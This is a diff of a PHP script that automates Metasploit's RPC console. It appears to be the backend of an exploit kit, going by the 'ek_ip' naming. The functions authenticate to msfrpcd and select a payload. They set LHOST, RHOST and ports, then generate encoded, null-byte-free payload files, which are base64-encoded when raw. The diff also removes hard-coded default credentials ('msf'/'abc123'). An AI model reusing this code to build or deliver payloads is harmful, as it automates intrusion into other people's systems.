@@ -122,7 +122,7 @@ function curl_post($url, $port, $httpheader, $postfields)
 }
 
 // ************  msf_auth() ************ //
-function msf_auth($ip, $username = "msf", $password = "abc123")
+function msf_auth($ip, $username, $password)
 {
 	//debug("START Function msf_auth()</br>");
 	//$data = array(0=>1,1=>2,2=>3);
@@ -198,7 +198,7 @@ function msf_console($ip, $token, $console_id, $cmd)
     
         //debug('end do while</br>');
     } while($server_read_response["busy"] == 1);
-    
+
     //debug("END Function msf_console()</br>");
     return $server_read_response;
 }
@@ -211,44 +211,53 @@ function msf_execute($ip, $token, $cmd)
 }
 
 
-function use_payload($ek_ip, $msf_payload, $msf_type, $msf_rhost, $msf_rport, $msf_lhost, $msf_lport, $msf_encoder, $file_name)
+function use_payload($ek_ip, $ek_un, $ek_pw, $msf_payload, $msf_type, $msf_rhost, $msf_rport, $msf_lhost, $msf_lport, $msf_encoder, $file_name)
 {
-    $token = msf_auth($ek_ip);
-   
+    $token = msf_auth($ek_ip, $ek_un, $ek_pw);
+
     $client_request = array("core.version", $token);
     $server_response = msf_cmd($ek_ip, $client_request);
-    
+
     $client_request = array("console.create", $token);
     $server_response = msf_cmd($ek_ip, $client_request);
     $console_id_one = $server_response["id"];
-	
-	$server_response = msf_console($ek_ip, $token, $console_id_one, "use " . $msf_payload);
-	//debug("msf_payload: " . $msf_payload . "</BR>");
-	
-	$server_response = msf_console($ek_ip, $token, $console_id_one, "set LHOST " . $msf_lhost);
-	
-	$server_response = msf_console($ek_ip, $token, $console_id_one, "set RHOST " . $msf_rhost);
-	
-	$server_response = msf_console($ek_ip, $token, $console_id_one, "set RPORT " . $msf_rport);
-	
-	$server_response = msf_console($ek_ip, $token, $console_id_one, "set LPORT " . $msf_lport);
-	
-	$server_response = msf_console($ek_ip, $token, $console_id_one, "set EXITFUNC thread");
-	
-	if($msf_type == "raw")
-	{
-		$tmp_file = "/tmp/" . (string)time();
-		$server_response = msf_console($ek_ip, $token, $console_id_one, "generate -t " . $msf_type . " -f " . $tmp_file . " -b \\x00 -e " . $msf_encoder);		
-		$server_response = msf_console($ek_ip, $token, $console_id_one, "cat " . $tmp_file . " | base64 -w 0 > " . $file_name);
-		$server_response = msf_console($ek_ip, $token, $console_id_one, "rm " . $tmp_file);
-	}
-	else
-	{
-		$server_response = msf_console($ek_ip, $token, $console_id_one, "generate -t " . $msf_type . " -f " . $file_name . " -b \\x00 -e " . $msf_encoder);
-	}
-		
-	return $server_response;
-	
+    
+    $server_response = msf_console($ek_ip, $token, $console_id_one, "use " . $msf_payload);
+    //debug("msf_payload: " . $msf_payload . "</BR>");
+    
+    $server_response = msf_console($ek_ip, $token, $console_id_one, "set LHOST " . $msf_lhost);
+    
+    $server_response = msf_console($ek_ip, $token, $console_id_one, "set RHOST " . $msf_rhost);
+    
+    $server_response = msf_console($ek_ip, $token, $console_id_one, "set RPORT " . $msf_rport);
+    
+    $server_response = msf_console($ek_ip, $token, $console_id_one, "set LPORT " . $msf_lport);
+    
+    $server_response = msf_console($ek_ip, $token, $console_id_one, "set EXITFUNC thread");
+    
+    if($msf_type == "raw")
+    {
+        $tmp_file = "/tmp/" . (string)time();
+        $generated_payload = "generate -t " . $msf_type . " -f " . $tmp_file . " -b \\x00 -e " . $msf_encoder;
+        //print $generated_payload;
+        $server_response = msf_console($ek_ip, $token, $console_id_one, $generated_payload);
+        sleep(1);
+        $server_response = msf_console($ek_ip, $token, $console_id_one, "cat " . $tmp_file . " | base64 -w 0 > " . $file_name);
+        sleep(1);
+        $server_response = msf_console($ek_ip, $token, $console_id_one, "rm " . $tmp_file);
+    }
+    else
+    {
+        $server_response = msf_console($ek_ip, $token, $console_id_one, "generate -t " . $msf_type . " -f " . $file_name . " -b \\x00 -e " . $msf_encoder);
+    }
+    
+    $fs = filesize($file_name);
+    
+    if($fs == 0) return false;
+    else return true;
+    
+    //return $server_response;
+
 }
 
 //$file1 = $OUTPUTDIR . "test1.html";
